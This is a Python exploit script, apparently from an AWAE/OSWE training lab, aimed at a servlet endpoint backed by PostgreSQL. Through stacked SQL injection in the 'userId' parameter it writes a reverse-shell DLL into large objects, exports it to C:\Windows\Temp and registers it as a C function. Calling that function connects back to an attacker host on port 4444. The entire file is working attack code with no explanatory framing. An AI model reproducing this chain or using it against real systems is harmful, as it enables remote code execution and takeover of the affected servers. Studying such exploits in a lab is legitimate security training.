import httpx
import base64

proxy = {
        "http://": "http://localhost:8080",
        "https://": "http://localhost:8080",
}

client = httpx.Client(
        verify=False,
        timeout=10.0,
#        proxies=proxy,
)

IP = "192.168.174.113"
PORT = "8443"
URL = f"https://{IP}:{PORT}/servlet/AMUserResourcesSyncServlet"
LHOST = "192.168.45.214"
LPORT = 4444

def send_request(payload):
    res = client.post(f"{URL}", data={"ForMasRange":"1","userId":f"1{payload}"})
    print(res.status_code)

def create_lo():
    payload = ";CREATE TABLE temp (loid oid);"
    payload += "INSERT INTO temp values (lo_import($$C:\\Windows\\win.ini$$));-- "
    send_request(payload)

def delete_lo():
    payload = f";DELETE FROM pg_largeobject WHERE loid = (SELECT max(loid) from temp);"
    payload += "DROP TABLE temp;-- "
    send_request(payload)

def chunk(bytes, size):
    for i in range(0,len(bytes), size):
        yield bytes[i: i + size]

def inject_dll():
    dll = open("./awae-rev.dll", "rb").read()

    for i, c in enumerate(chunk(dll, 2048)):
        if i == 0:
            payload = f";UPDATE pg_largeobject SET data=decode($${c.hex()}$$, $$hex$$)"
            payload += " where loid = (SELECT max(loid) from temp) and pageno=0;-- "
        else:
            payload = f";INSERT INTO pg_largeobject (loid, pageno, data) VALUES ("
            payload += f"(SELECT max(loid) from temp), {i}, decode($${c.hex()}$$, $$hex$$)"
            payload += ");-- "

        send_request(payload)

def export_dll():
    payload = f";SELECT lo_export((SELECT max(loid) from temp), $$C:\\Windows\\Temp\\awae-rev.dll$$);-- "
    send_request(payload)

def define_udf():
    payload = f";CREATE OR REPLACE FUNCTION test(text, integer) RETURNS VOID as "
    payload += "$$C:\\Windows\\Temp\\awae-rev.dll$$, $$connect_back$$ language C strict;-- "
    send_request(payload)

def execute_udf():
    payload = f";SELECT test($${LHOST}$$, {LPORT});-- "
    send_request(payload)

if __name__ == "__main__":
    create_lo()
    inject_dll()
    export_dll()
    define_udf()
    execute_udf()
    delete_lo()
